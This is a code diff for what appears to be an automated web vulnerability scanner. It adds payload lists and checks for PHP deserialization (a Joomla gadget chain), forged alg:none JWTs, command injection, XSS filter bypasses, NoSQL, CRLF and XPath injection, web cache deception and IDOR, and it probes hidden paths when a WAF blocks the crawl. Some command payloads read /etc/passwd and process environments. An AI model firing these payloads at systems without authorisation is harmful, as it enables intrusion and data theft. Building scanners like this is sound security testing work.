+    'O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\\x00\\x00\\x00disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"SimplePie_Sanitize":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:6:"assert";s:10:"javascript";i:9999;s:8:"feed_url";s:37:"phpinfo();JFactory::getConfig();exit;";}i:1;s:4:"init";}}s:13:"\\x00\\x00\\x00connection";b:1;}',
+]
+_PHP_DESER_ERROR_RE = re.compile(
+    r'unserialize\(\)|__wakeup|__destruct|__toString|'
+    r'O:\d+:"|a:\d+:{|'
+    r'Exception.*unserialize|'
+    r'Serialization of .* is not allowed|'
+    r'PHP Fatal error.*unserialize',
+    re.I,
+)
+
+# ── JWT attacks ────────────────────────────────────────────────────────────────
+
+# alg:none forged token: {"alg":"none","typ":"JWT"}.{"sub":"admin","role":"admin","iat":1}
+_JWT_NONE_TOKEN = (
+    'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0'
+    '.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MX0'
+    '.'
+)
+# Weak secrets commonly used in JWT signing
+_JWT_WEAK_SECRETS = ['secret', 'password', '123456', 'qwerty', 'admin', 'jwt', 'token', 'key', '']
+_JWT_HEADER_NAMES = [
+    'Authorization',
+    'X-Auth-Token',
+    'X-Access-Token',
+    'X-JWT-Token',
+    'X-Token',
+    'JWT',
+    'Token',
+]
+
 # ── SSRF ──────────────────────────────────────────────────────────────────────
 
 _SSRF_PARAM_RE = re.compile(
@@ -958,9 +1453,12 @@ def create_session(
     extra_headers: Optional[Dict[str, str]] = None,
     waf_bypass: bool = False,
     oob_enabled: bool = True,
+    think_mode: bool = False,
+    depth: str = 'normal',
 ) -> str:
     sid = str(uuid.uuid4())[:12]
     parsed = urlparse(url)
+    _think_engine = build_think_engine([], depth) if think_mode else None
     with _lock:
         _sessions[sid] = {
             'id':            sid,
@@ -1003,12 +1501,13 @@ def create_session(
             'finished_at':   None,
             'error':         None,
             '_finding_keys': set(),
+            '_think_engine': _think_engine,
         }
         _sessions[sid]['_pause_evt'].set()  # SET = running (not paused)
     return sid
 
 
-_INTERNAL_KEYS = {'_stop', '_pause_evt', '_finding_keys', 'oob_client', 'stored_xss_canaries'}
+_INTERNAL_KEYS = {'_stop', '_pause_evt', '_finding_keys', 'oob_client', 'stored_xss_canaries', '_think_engine'}
 
 
 def get_session(sid: str) -> Optional[Dict]:
@@ -1239,13 +1738,18 @@ async def _scan(sid: str) -> None:
         await _check_pause(sid)
         endpoints = await _crawl_phase(sid, cfg, http)
         if not endpoints:
+            # Crawl was blocked — attempt hidden/common path probing before giving up
+            logger.info('[ActiveScan] Crawl returned 0 endpoints for %s — trying fallback path probe', cfg["url"])
+            endpoints = await _probe_fallback_paths(sid, cfg, http)
+        if not endpoints:
             _proxy = scan_proxy.get_proxy_url()
-            hint = (
-                'Possible causes: '
-                f'{"(1) scan proxy " + _proxy + " unreachable — disable it in Settings; " if _proxy else ""}'
-                '(2) target blocked or returned only 4xx/5xx; '
-                '(3) Playwright not installed — run "playwright install chromium".'
-            )
+            _causes = []
+            if _proxy:
+                _causes.append(f'(1) scan proxy {_proxy} unreachable — disable it in Settings')
+            _causes.append('(2) target is blocking automated crawlers (WAF / bot protection / 4xx)')
+            if not _PLAYWRIGHT_OK:
+                _causes.append('(3) Playwright not installed — run "playwright install chromium --with-deps"')
+            hint = 'Possible causes: ' + '; '.join(_causes) + '.'
             logger.warning('[ActiveScan] Crawl returned 0 endpoints for %s. %s', cfg["url"], hint)
             _set(sid, phase='done', running=False, done=True,
                  error=f'Crawl returned 0 endpoints — no pages could be fetched. {hint}')
@@ -1264,6 +1768,12 @@ async def _scan(sid: str) -> None:
 
         # Inject tech-stack-specific payloads from ThinkEngine's payload map
         _inject_tech_payloads(tech)
+
+        # Update ThinkEngine tech stack now that fingerprinting is done
+        with _lock:
+            _te = _sessions.get(sid, {}).get('_think_engine')
+        if _te is not None:
+            _te.tech_stack = [t.get('name', '').lower() for t in tech if isinstance(t, dict)]
 
         # ── Phase 3: Probe ────────────────────────────────────────────────────
         _set(sid, phase='probe', total_endpoints=len(endpoints), endpoints=endpoints,
@@ -1426,8 +1936,32 @@ def _inject_tech_payloads(tech_stack: List[Dict]) -> None:
                     existing.add(p)
 
 
+def _make_curl_poc(finding: Dict) -> str:
+    """Build a copy-paste curl command from a finding's evidence."""
+    ev  = finding.get('evidence') or {}
+    url = ev.get('request_url') or finding.get('endpoint', '')
+    if not url:
+        return ''
+    method = ev.get('method', 'GET').upper()
+    payload = ev.get('payload', '')
+    parts = [f'curl -sk -X {method}', f"'{url}'"]
+    body = ev.get('post_body', '')
+    if body:
+        parts.append(f"--data '{body[:300]}'")
+    elif method == 'POST' and payload:
+        parts.append(f"--data '{payload[:300]}'")
+    return ' '.join(parts)
+
+
 def _add_finding(sid: str, finding: Dict) -> None:
     """Score, FP-filter, dedup, then append finding."""
+    # Auto-inject curl_poc if not already present
+    ev = finding.get('evidence')
+    if isinstance(ev, dict) and not ev.get('curl_poc'):
+        poc = _make_curl_poc(finding)
+        if poc:
+            ev['curl_poc'] = poc
+
     # Score and FP-filter before dedup (avoids caching suppressed findings)
     conf = score_finding(finding)
     finding['confidence_score'] = round(conf, 3)
@@ -1451,6 +1985,103 @@ def _add_finding(sid: str, finding: Dict) -> None:
                 return
             s['_finding_keys'].add(dedup_key)
             s['findings'].append(finding)
+
+
+# ── Phase 1: Fallback path probe (when crawl is blocked) ─────────────────────
+
+async def _probe_fallback_paths(sid: str, cfg: Dict, http: aiohttp.ClientSession) -> List[Dict]:
+    """Probe known common/hidden paths when crawl returns 0 endpoints.
+
+    Used when the target blocks headless browsers and plain HTTP crawl (WAF/bot
+    protection). Mirrors the strategy used by EndpointDiscovery.run() in Hunt so
+    the Active Scanner can still seed itself even against heavily guarded targets.
+    """
+    from core.modules.endpoint_discovery import HIDDEN_PATHS
+
+    base = cfg['url'].rstrip('/')
+    _set(sid, phase_detail='[fallback] Crawl blocked — probing common paths…')
+
+    # ── 404 baseline: detect soft-404 / WAF-blanket-block fingerprint ────────────
+    _404_status, _404_len, _404_body_hash = 404, 0, None
+    try:
+        async with http.get(
+            f'{base}/ds1hunter_nonexistent_zz9z_probe',
+            allow_redirects=False, ssl=False,
+        ) as r:
+            _404_status = r.status
+            _bdata = await r.read()
+            _404_len  = len(_bdata)
+            import hashlib as _hl
+            _404_body_hash = _hl.md5(_bdata[:512]).hexdigest()
+    except Exception:
+        pass
+
+    # WAF-blanket mode: baseline itself is 401/403 — every path gets blocked.
+    # In this mode we keep ALL responses that differ in status OR body from baseline.
+    _waf_blanket = _404_status in (401, 403)
+
+    sem = asyncio.Semaphore(15)
+    endpoints: List[Dict] = []
+
+    async def _probe(path: str) -> None:
+        url = base + path
+        async with sem:
+            try:
+                async with http.get(url, allow_redirects=False, ssl=False) as resp:
+                    status = resp.status
+                    ct     = resp.headers.get('Content-Type', '').split(';')[0].strip()
+                    bdata  = await resp.read()
+                    cl     = len(bdata)
+                    import hashlib as _hl2
+                    body_hash = _hl2.md5(bdata[:512]).hexdigest()
+
+                    if _waf_blanket:
+                        # In WAF-blanket mode: keep only responses that differ from
+                        # baseline in status OR have meaningfully different body
+                        if status == _404_status and body_hash == _404_body_hash:
+                            return
+                        if status == _404_status and abs(cl - _404_len) < 64:
+                            return
+                    else:
+                        # Normal mode: filter exact soft-404 fingerprint
+                        if status == _404_status and abs(cl - _404_len) < 64:
+                            return
+
+                    if status in (200, 201, 204, 301, 302, 307, 308, 401, 403, 405):
+                        endpoints.append({
+                            'url':    url,
+                            'method': 'GET',
+                            'params': [],
+                            'forms':  [],
+                            'status': status,
+                            'ct':     ct,
+                            'source': 'fallback_probe',
+                        })
+                        logger.info('[ActiveScan] Fallback probe: %s (%d)', path, status)
+            except Exception:
+                pass
+
+    await asyncio.gather(*[_probe(p) for p in HIDDEN_PATHS], return_exceptions=True)
+
+    # ── Also parse robots.txt for additional paths ────────────────────────────
+    try:
+        async with http.get(f'{base}/robots.txt', allow_redirects=False, ssl=False) as r:
+            if r.status == 200:
+                text = await r.text(errors='replace')
+                extra = []
+                for line in text.splitlines():
+                    line = line.strip()
+                    if line.lower().startswith(('allow:', 'disallow:')):
+                        path = line.split(':', 1)[1].strip()
+                        if path and path != '/' and '*' not in path:
+                            extra.append(path)
+                if extra:
+                    await asyncio.gather(*[_probe(p) for p in extra[:60]], return_exceptions=True)
+    except Exception:
+        pass
+
+    logger.info('[ActiveScan] Fallback probe complete — %d endpoints found', len(endpoints))
+    return endpoints
 
 
 # ── Phase 1: Crawl ────────────────────────────────────────────────────────────
@@ -1718,6 +2349,20 @@ async def _crawl_aiohttp(sid: str, cfg: Dict, http: aiohttp.ClientSession) -> Li
 
             if result['status'] < 400 or params or ep['forms']:
                 endpoints.append(ep)
+                # Feed response into ThinkEngine ContextStore if think mode active
+                with _lock:
+                    _te = _sessions.get(sid, {}).get('_think_engine')
+                if _te is not None and result.get('body'):
+                    try:
+                        _jdata = None
+                        if 'json' in result.get('ct', ''):
+                            try:
+                                _jdata = _json_mod.loads(result['body'])
+                            except Exception:
+                                pass
+                        _te.harvest(url, result['body'], _jdata)
+                    except Exception:
+                        pass
 
         current_level = next_level
 
@@ -1845,6 +2490,15 @@ async def _probe_endpoint(
         await _check_mass_assignment(sid, url, http, ep)
     if 'cache_poison' in checks:
         await _check_cache_poisoning(sid, url, http)
+        await _check_web_cache_deception(sid, url, http)
+
+    # Per-endpoint header-level checks (run once per endpoint)
+    await _check_sqli_headers(sid, url, http)
+    await _check_xss_headers(sid, url, http)
+    await _check_ssrf_headers(sid, url, http)
+    await _check_jwt(sid, url, http)
+    await _check_php_deser(sid, url, http)
+    await _check_file_upload(sid, url, http, forms=ep.get('forms', []))
 
     # Redirect checks that run once per endpoint (not per-param)
     parsed_ep = urlparse(url)
@@ -1886,12 +2540,81 @@ async def _probe_endpoint(
                 await _check_php_injection(sid, url, parsed, qs, param, http)
             if 'proto_poll' in checks:
                 await _check_prototype_pollution(sid, url, parsed, qs, param, http)
+            await _check_nosqli_param(sid, url, parsed, qs, param, http)
+            await _check_crlf(sid, url, parsed, qs, param, http)
+            await _check_xpath(sid, url, parsed, qs, param, http)
+            await _check_ldap_injection(sid, url, parsed, qs, param, http)
+            await _check_hpp(sid, url, parsed, qs, param, http)
+            await _check_second_order(sid, url, parsed, qs, param, http)
 
             await asyncio.sleep(0.08)
 
         # DOM XSS: one browser session per endpoint covering all params at once
         if 'dom_xss' in checks and params:
             await _check_dom_xss_endpoint(sid, url, parsed, qs, params, http)
+
+        # Think mode: cross-endpoint context injection (IDOR / privilege escalation)
+        with _lock:
+            _te = _sessions.get(sid, {}).get('_think_engine')
+        if _te is not None and params:
+            _ctx_probes = _te.inject_context(url, params)
+            for _probe_params in _ctx_probes:
+                if _stopped(sid):
+                    break
+                _ctx_qs = dict(qs)
+                for _p, _v in _probe_params.items():
+                    _ctx_qs[_p] = [_v]
+                _ctx_target = urlunparse(parsed._replace(
+                    query=urlencode({k: v[0] if isinstance(v, list) else v
+                                     for k, v in _ctx_qs.items()})
+                ))
+                try:
+                    async with http.get(_ctx_target, allow_redirects=False,
+                                        headers=base_headers) as _cr:
+                        _ctx_body = await _cr.text(errors='replace')
+                        _ctx_status = _cr.status
+                    # Harvest from context probe responses too
+                    try:
+                        _cj = None
+                        if 'json' in _cr.headers.get('Content-Type', ''):
+                            try:
+                                _cj = _json_mod.loads(_ctx_body)
+                            except Exception:
+                                pass
+                        _te.harvest(_ctx_target, _ctx_body, _cj)
+                    except Exception:
+                        pass
+                    # Flag successful access to different user's data (IDOR heuristic)
+                    if _ctx_status == 200 and _ctx_body:
+                        _orig_parsed = urlparse(url)
+                        _orig_qs = parse_qs(_orig_parsed.query, keep_blank_values=True)
+                        for _p, _v in _probe_params.items():
+                            _orig_v = _orig_qs.get(_p, [None])[0]
+                            if _orig_v and _orig_v != _v and len(_ctx_body) > 50:
+                                _add_finding(sid, {
+                                    'severity': 'high',
+                                    'title':    f'Possible IDOR - {_p} (Cross-Endpoint Context)',
+                                    'endpoint': url,
+                                    'detail': (
+                                        f'Think mode context injection: parameter {_p!r} was set to '
+                                        f'{_v!r} (harvested from another endpoint). '
+                                        f'Server returned HTTP {_ctx_status} with {len(_ctx_body)} bytes '
+                                        f'— suggests access to another object may be possible.'
+                                    ),
+                                    'evidence': {
+                                        'param':       _p,
+                                        'injected':    _v,
+                                        'original':    _orig_v,
+                                        'status':      _ctx_status,
+                                        'body_length': len(_ctx_body),
+                                        'request_url': _ctx_target,
+                                        'source':      'think_context_store',
+                                    },
+                                })
+                                break
+                except Exception:
+                    pass
+                await asyncio.sleep(0.05)
 
     # Form-level checks
     for form in ep.get('forms', []):
@@ -1931,6 +2654,12 @@ async def _probe_endpoint(
         if 'stored_xss' in checks:
             if _stopped(sid): return
             await _inject_stored_xss_canary(sid, form, http)
+        if _stopped(sid): return
+        await _check_form_xpath(sid, form, http)
+        if _stopped(sid): return
+        await _check_form_ldap(sid, form, http)
+        if _stopped(sid): return
+        await _check_form_nosqli(sid, form, http)
 
 
 # ── Individual checks ─────────────────────────────────────────────────────────
@@ -1987,29 +2716,42 @@ async def _check_xss(sid, url, parsed, qs, param, http):
     except Exception:
         pass
 
-    canary  = f'{_XSS_CANARY_PREFIX}{uuid.uuid4().hex[:8]}'
-    payload = f'<script>alert("{canary}")</script>'
-    target  = _mutate_url(parsed, qs, param, payload)
-    try:
-        async with http.get(target, allow_redirects=False) as resp:
-            body = await resp.text(errors='replace')
-            if canary in body and payload in body and canary not in baseline_body:
-                idx = body.find(payload)
-                excerpt = body[max(0, idx - 80):idx + len(payload) + 80].strip() if idx >= 0 else ''
-                _add_finding(sid, {
-                    'severity': 'high',
-                    'title':    f'Reflected XSS - {param}',
-                    'endpoint': url,
-                    'detail':   'Payload reflected verbatim without encoding.',
-                    'evidence': {
-                        'param':            param,
-                        'payload':          payload,
-                        'request_url':      target,
-                        'response_excerpt': excerpt,
-                    },
-                })
-    except Exception:
-        pass
+    # Try multiple payloads: <script> first (no WAF), then event-handler bypasses
+    canary = f'{_XSS_CANARY_PREFIX}{uuid.uuid4().hex[:8]}'
+    _xss_probes = [
+        f'<script>alert("{canary}")</script>',
+        f'<img src=x onerror=alert("{canary}")>',
+        f'<svg onload=alert("{canary}")>',
+        f'<details open ontoggle=alert("{canary}")>',
+        f'"><img src=x onerror=alert("{canary}")>',
+        f"'><svg onload=alert('{canary}')>",
+        f'<body onload=alert("{canary}")>',
+        f'javascript:alert("{canary}")',
+    ]
+    for payload in _xss_probes:
+        target = _mutate_url(parsed, qs, param, payload)
+        try:
+            async with http.get(target, allow_redirects=False) as resp:
+                body = await resp.text(errors='replace')
+                if canary in body and canary not in baseline_body:
+                    idx = body.find(canary)
+                    excerpt = body[max(0, idx - 80):idx + len(payload) + 80].strip() if idx >= 0 else ''
+                    _add_finding(sid, {
+                        'severity': 'high',
+                        'title':    f'Reflected XSS - {param}',
+                        'endpoint': url,
+                        'detail':   f'Canary reflected without encoding with payload: {payload!r}',
+                        'evidence': {
+                            'param':            param,
+                            'payload':          payload,
+                            'request_url':      target,
+                            'response_excerpt': excerpt,
+                        },
+                    })
+                    return
+        except Exception:
+            pass
+        await asyncio.sleep(0.05)
 
 
 async def _check_ssti(sid, url, parsed, qs, param, http):
@@ -2514,7 +3256,7 @@ _CMD_PAYLOADS = [
     '%0d%0asleep 5',
     # ── Unix: IFS / glob bypass ───────────────────────────────────────────────
     ';${IFS}sleep${IFS}5',
-    ';s\leep 5',
+    r';s\leep 5',
     ';sl?ep 5',
     ';/???/????p 5',
     ';/???/sl*p 5',
@@ -2549,6 +3291,45 @@ _CMD_PAYLOADS = [
     ';ping -c 5 127.0.0.1',
     ';nslookup ds1hunter-cmdi.invalid',
     ';curl http://ds1hunter-cmdi.invalid',
+    # ── Unix: backtick/subshell variants ─────────────────────────────────────
+    '`/usr/bin/id`',
+    '`/bin/cat /etc/passwd`',
+    '$(cat /etc/passwd)',
+    '$({cat,/etc/passwd})',
+    '$(</etc/passwd)',
+    ';printf "%s" "$(id)"',
+    # ── Unix: base64 decode obfuscation ──────────────────────────────────────
+    ';eval $(echo aWQ= | base64 -d)',
+    ';bash -c {echo,aWQ=}|{base64,-d}|bash',
+    # ── Unix: environment variable expansion ──────────────────────────────────
+    ';$HOME/../bin/id',
+    ';${HOME:0:1}bin${HOME:0:1}id',
+    # ── Unix: redirection-based detection ────────────────────────────────────
+    ';id>/tmp/ds1out;cat /tmp/ds1out',
+    ';id 2>&1',
+    # ── Unix: special file descriptors ───────────────────────────────────────
+    ';cat /proc/version',
+    ';cat /proc/self/environ',
+    ';ls /etc/',
+    # ── Windows: encoded commands ─────────────────────────────────────────────
+    '& powershell -EncodedCommand aQBkAA==',
+    '| powershell -nop -c "whoami"',
+    '& cmd /c whoami',
+    '& cmd /c "net user"',
+    '; Get-Content C:\\Windows\\win.ini',
+    # ── Windows: wscript / cscript ────────────────────────────────────────────
+    '& wscript //E:jscript //B /nologo',
+    # ── Command separator variations ──────────────────────────────────────────
+    '%26%26 id',
+    '%7C id',
+    '%0aid',
+    '%0d%0aid',
+    '\nid\n',
+    '\r\nid\r\n',
+    # ── Polyglot (Unix+Windows) ───────────────────────────────────────────────
+    '|id|whoami',
+    ';id;whoami',
+    '$(id)&&whoami',
 ]
 _CMD_ERROR_SIG = re.compile(
     r'sh: .*(not found|command not found)|'
@@ -2591,7 +3372,7 @@ async def _check_cmd_inject(sid, url, parsed, qs, param, http, oob_client=None):
     _timing_threshold = max(4.5, baseline_time * 3)
 
     # Error-based + timing detection
-    for pl in _CMD_PAYLOADS[:3]:
+    for pl in _CMD_PAYLOADS[:25]:
         target = _mutate_url(parsed, qs, param, pl)
         try:
             t0 = time.monotonic()
@@ -2799,7 +3580,7 @@ async def _check_sqli_blind_boolean(sid, url, parsed, qs, param, http):
 
 
 async def _check_sqli_blind_time(sid, url, parsed, qs, param, http, oob_client=None):
-    """Time-based blind: inject SLEEP payloads, look for 5s+ response delay."""
+    """Time-based blind SQLi: statistical baseline + SLEEP payload anomaly detection."""
     if oob_client:
         token = oob_client.generate_token('sqli')
         oob_client.register_pending(token, 'sqli_blind', {
@@ -2807,7 +3588,21 @@ async def _check_sqli_blind_time(sid, url, parsed, qs, param, http, oob_client=N
         })
     _tgt_host = parsed.hostname or ''
     _px = scan_proxy.get_proxy_url()
-    slow_timeout = aiohttp.ClientTimeout(total=15 if _px else 8)
+    slow_timeout = aiohttp.ClientTimeout(total=15 if _px else 10)
+
+    # Statistical baseline: 5 clean requests → mean + σ
+    _timing = TimingAnalyzer()
+    try:
+        conn = scan_proxy.make_connector(limit=10, target_host=_tgt_host)
+        async with aiohttp.ClientSession(connector=conn,
+                                         timeout=aiohttp.ClientTimeout(total=8)) as _bl_sess:
+            await _timing.baseline(url, _bl_sess)
+    except Exception:
+        pass  # baseline failure → TimingAnalyzer falls back to 4.5s hardcoded
+
+    logger.debug('[TimingSQLi] %s param=%s threshold=%.2fs (baseline_ready=%s)',
+                 url, param, _timing.threshold, _timing.ready)
+
     for pl, db in _TIME_PAYLOADS:
         target = _mutate_url(parsed, qs, param, pl)
         try:
@@ -2815,21 +3610,31 @@ async def _check_sqli_blind_time(sid, url, parsed, qs, param, http, oob_client=N
             async with aiohttp.ClientSession(connector=conn, timeout=slow_timeout) as sess:
                 t0 = time.monotonic()
                 async with sess.get(target, allow_redirects=False) as resp:
-                    await resp.read()
+                    body = await resp.read()
                     elapsed = time.monotonic() - t0
-            if elapsed >= 4.5:
+            if _timing.is_anomaly(elapsed, len(body)):
                 _add_finding(sid, {
                     'severity': 'critical',
                     'title':    f'SQL Injection (Time Blind, {db}) - {param}',
                     'endpoint': url,
-                    'detail':   f'Response delayed {elapsed:.1f}s with SLEEP payload - confirmed time-based SQLi ({db}).',
+                    'detail': (
+                        f'Response delayed {elapsed:.2f}s with SLEEP payload '
+                        f'(baseline mean={_timing.mean:.2f}s σ={_timing.std:.2f}s '
+                        f'threshold={_timing.threshold:.2f}s) — confirmed time-based SQLi ({db}).'
+                    ),
                     'evidence': {
                         'param':            param,
                         'payload':          pl,
-                        'delay_sec':        round(elapsed, 2),
+                        'delay_sec':        round(elapsed, 3),
+                        'baseline_mean':    round(_timing.mean, 3),
+                        'baseline_std':     round(_timing.std, 3),
+                        'threshold':        round(_timing.threshold, 3),
                         'db':               db,
                         'request_url':      target,
-                        'response_excerpt': f'Response delayed {elapsed:.1f}s with {pl!r} (DB: {db})',
+                        'response_excerpt': (
+                            f'Delayed {elapsed:.2f}s > threshold {_timing.threshold:.2f}s '
+                            f'with {pl!r} (DB: {db})'
+                        ),
                     },
                 })
                 return
@@ -2838,13 +3643,13 @@ async def _check_sqli_blind_time(sid, url, parsed, qs, param, http, oob_client=N
                 'severity': 'critical',
                 'title':    f'SQL Injection (Time Blind, {db}) - {param}',
                 'endpoint': url,
-                'detail':   f'Request timed out (>18s) with SLEEP payload - confirmed time-based SQLi ({db}).',
+                'detail':   f'Request timed out with SLEEP payload — confirmed time-based SQLi ({db}).',
                 'evidence': {
                     'param':            param,
                     'payload':          pl,
                     'db':               db,
                     'request_url':      target,
-                    'response_excerpt': f'Request timed out (>18s) with {pl!r} (DB: {db})',
+                    'response_excerpt': f'Timeout with {pl!r} (DB: {db})',
                 },
             })
             return
@@ -3304,7 +4109,7 @@ async def _check_form_cmd_inject(sid, form, http):
         pass
     _timing_threshold = max(4.5, baseline_time * 3)
 
-    for pl in _CMD_PAYLOADS[:3]:
+    for pl in _CMD_PAYLOADS[:25]:
         data = {inp['name']: pl for inp in form['inputs']}
         try:
             t0 = time.monotonic()
@@ -4571,6 +5376,186 @@ _PROTO_POLL_ERROR_SIG = re.compile(
 )
 
 
+_NOSQLI_OPS_SIMPLE = [
+    # MongoDB operator injection via query string
+    "[$ne]=1", "[$gt]=", "[$regex]=.*", "[$where]=1",
+    '{"$ne":null}', '{"$gt":""}', '{"$regex":".*"}',
+    # Auth bypass style
+    "[$ne]=invalid", '{"$ne":"invalid"}', '{"$gte":""}',
+]
+_NOSQLI_ERRORS = re.compile(
+    r'MongoError|MongoServerError|BSONTypeError|CastError|'
+    r'ValidationError.*mongoose|mongo_message|'
+    r'\$where.*is not allowed|Unrecognized pipeline stage|'
+    r'cannot use a string to match against|'
+    r'BadValue.*unknown operator|'
+    r'Failed to parse|SyntaxError.*JSON',
+    re.I,
+)
+
+async def _check_nosqli_param(sid: str, url: str, parsed, qs: Dict, param: str, http) -> None:
+    """NoSQL operator injection via URL query params."""
+    baseline_body = ''
+    baseline_status = 200
+    try:
+        async with http.get(url, allow_redirects=False) as r:
+            baseline_body = await r.text(errors='replace')
+            baseline_status = r.status
+    except Exception:
+        return
+
+    for pl in _NOSQLI_OPS_SIMPLE:
+        target = _mutate_url(parsed, qs, param, pl)
+        try:
+            async with http.get(target, allow_redirects=False) as r:
+                body = await r.text(errors='replace')
+                status = r.status
+            # Auth bypass pattern: was 401/403/404, now 200/redirect
+            if baseline_status in (401, 403, 404) and status < 300:
+                _add_finding(sid, {
+                    'severity': 'critical',
+                    'title':    f'NoSQL Injection (Auth Bypass) - {param}',
+                    'endpoint': url,
+                    'detail':   f'Operator {pl!r} changed response from {baseline_status} → {status}.',
+                    'evidence': {'param': param, 'payload': pl, 'request_url': target,
+                                 'baseline_status': baseline_status, 'injected_status': status},
+                })
+                return
+            # Error disclosure
+            m = _NOSQLI_ERRORS.search(body)
+            if m and m.group(0) not in baseline_body:
+                _add_finding(sid, {
+                    'severity': 'medium',
+                    'title':    f'NoSQL Injection (Error Disclosure) - {param}',
+                    'endpoint': url,
+                    'detail':   f'NoSQL error pattern detected with payload {pl!r}.',
+                    'evidence': {'param': param, 'payload': pl, 'request_url': target,
+                                 'error': m.group(0)},
+                })
+                return
+        except Exception:
+            pass
+        await asyncio.sleep(0.05)
+
+
+_CRLF_PAYLOADS = [
+    '%0d%0aX-Injected: ds1hunter',
+    '%0aX-Injected: ds1hunter',
+    '%0d%0a%20X-Injected: ds1hunter',
+    '\r\nX-Injected: ds1hunter',
+    '\nX-Injected: ds1hunter',
+    '%E5%98%8D%E5%98%8AX-Injected: ds1hunter',  # UTF-8 CRLF bypass
+    '%0d%0aSet-Cookie: ds1hunter=1',
+    '%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK',
+    '%0d%0aLocation: https://evil.ds1hunter.com',
+]
+
+async def _check_crlf(sid: str, url: str, parsed, qs: Dict, param: str, http) -> None:
+    """CRLF injection — inject \\r\\n into a parameter and look for reflected headers."""
+    for pl in _CRLF_PAYLOADS:
+        target = _mutate_url(parsed, qs, param, pl)
+        try:
+            async with http.get(target, allow_redirects=False) as r:
+                hdrs = dict(r.headers)
+                body = await r.text(errors='replace')
+            if 'X-Injected' in hdrs or 'x-injected' in hdrs:
+                _add_finding(sid, {
+                    'severity': 'high',
+                    'title':    f'CRLF Injection / HTTP Response Splitting - {param}',
+                    'endpoint': url,
+                    'detail':   f'Injected header X-Injected appeared in response headers with payload {pl!r}.',
+                    'evidence': {
+                        'param':           param,
+                        'payload':         pl,
+                        'request_url':     target,
+                        'injected_header': hdrs.get('X-Injected', hdrs.get('x-injected', '')),
+                    },
+                })
+                return
+            # Check if CRLF caused header content to spill into body (response splitting)
+            if 'X-Injected: ds1hunter' in body or 'Set-Cookie: ds1hunter' in body:
+                _add_finding(sid, {
+                    'severity': 'medium',
+                    'title':    f'CRLF Injection (Body Reflection) - {param}',
+                    'endpoint': url,
+                    'detail':   f'CRLF-injected header string reflected in body with payload {pl!r}.',
+                    'evidence': {'param': param, 'payload': pl, 'request_url': target},
+                })
+                return
+        except Exception:
+            pass
+        await asyncio.sleep(0.05)
+
+
+_CACHE_DECEPTION_SUFFIXES = [
+    '/account.css', '/profile.js', '/dashboard.png', '/settings.jpg',
+    '/user.ico', '/data.gif', '/api.woff2', '/info.svg',
+]
+_CACHE_DECEPTION_DYNAMIC_MARKERS = re.compile(
+    r'(email|username|user_id|account_id|balance|credit|token|session|csrftoken)',
+    re.I,
+)
+
+async def _check_web_cache_deception(sid: str, url: str, http) -> None:
+    """Web Cache Deception — append static suffixes to dynamic pages and check for caching."""
+    try:
+        async with http.get(url, allow_redirects=False) as r:
+            baseline_body = await r.text(errors='replace')
+            baseline_status = r.status
+            baseline_cache = {k.lower() for k in r.headers if k.lower() in
+                              {'cache-control', 'age', 'x-cache', 'cf-cache-status', 'vary'}}
+    except Exception:
+        return
+
+    # Only interesting on pages that return user-sensitive content
+    if not _CACHE_DECEPTION_DYNAMIC_MARKERS.search(baseline_body):
+        return
+    if baseline_status not in (200, 304):
+        return
+
+    for suffix in _CACHE_DECEPTION_SUFFIXES:
+        test_url = url.rstrip('/') + suffix
+        try:
+            async with http.get(test_url, allow_redirects=False) as r:
+                body = await r.text(errors='replace')
+                status = r.status
+                hdrs = {k.lower(): v for k, v in r.headers.items()}
+            if status != 200:
+                continue
+            # Check for cache HIT indicator on a URL that should be dynamic
+            cache_hit = (
+                hdrs.get('x-cache', '').lower() in ('hit', 'hit from cloudfront') or
+                hdrs.get('cf-cache-status', '').lower() == 'hit' or
+                hdrs.get('age', '0') not in ('0', '') or
+                'public' in hdrs.get('cache-control', '') and 'no-store' not in hdrs.get('cache-control', '')
+            )
+            # Response body contains sensitive-looking markers from the baseline
+            if _CACHE_DECEPTION_DYNAMIC_MARKERS.search(body) and cache_hit:
+                _add_finding(sid, {
+                    'severity': 'high',
+                    'title':    'Web Cache Deception',
+                    'endpoint': url,
+                    'detail':   (
+                        f'Dynamic page with sensitive content ({url}) is cached when '
+                        f'accessed as {test_url}. Attackers can trick users into visiting '
+                        f'the static-extension URL, caching their personal data.'
+                    ),
+                    'evidence': {
+                        'original_url':    url,
+                        'deception_url':   test_url,
+                        'suffix':          suffix,
+                        'cache_indicator': {k: hdrs.get(k) for k in
+                                           ('x-cache', 'cf-cache-status', 'age', 'cache-control')
+                                           if hdrs.get(k)},
+                        'curl_poc':        f"curl -sk '{test_url}'",
+                    },
+                })
+                return
+        except Exception:
+            pass
+        await asyncio.sleep(0.1)
+
+
 async def _check_prototype_pollution(sid: str, url: str, parsed, qs: Dict, param: str, http) -> None:
     """Prototype pollution: two confirmation signals required before flagging.
 
@@ -4949,3 +5934,714 @@ async def _check_ws_inject(sid, ws_url, http):
                     pass
     except Exception:
         pass
+
+
+# ── XPath Injection ───────────────────────────────────────────────────────────
+
+async def _check_xpath(sid, url, parsed, qs, param, http):
+    try:
+        async with http.get(url, allow_redirects=False) as r:
+            baseline = await r.text(errors='replace')
+    except Exception:
+        return
+    for pl in _XPATH_PAYLOADS:
+        if _stopped(sid):
+            return
+        target = _mutate_url(parsed, qs, param, pl)
+        try:
+            async with http.get(target, allow_redirects=False) as resp:
+                body = await resp.text(errors='replace')
+            m = _XPATH_ERROR_RE.search(body)
+            if m and not _XPATH_ERROR_RE.search(baseline):
+                _add_finding(sid, {
+                    'severity': 'high',
+                    'title':    'XPath Injection',
+                    'endpoint': url,
+                    'param':    param,
+                    'detail': (
+                        f'XPath error signature {m.group(0)!r} triggered by payload {pl!r} '
+                        f'on parameter {param!r}. Application may expose XML data store.'
+                    ),
+                    'evidence': {'payload': pl, 'match': m.group(0)},
+                })
+                return
+        except Exception:
+            pass
+
+
+async def _check_form_xpath(sid, form, http):
+    try:
+        async with http.get(form['action'], allow_redirects=False) as r:
+            baseline = await r.text(errors='replace')
+    except Exception:
+        return
+    method = form.get('method', 'GET').upper()
+    for pl in _XPATH_PAYLOADS[:10]:
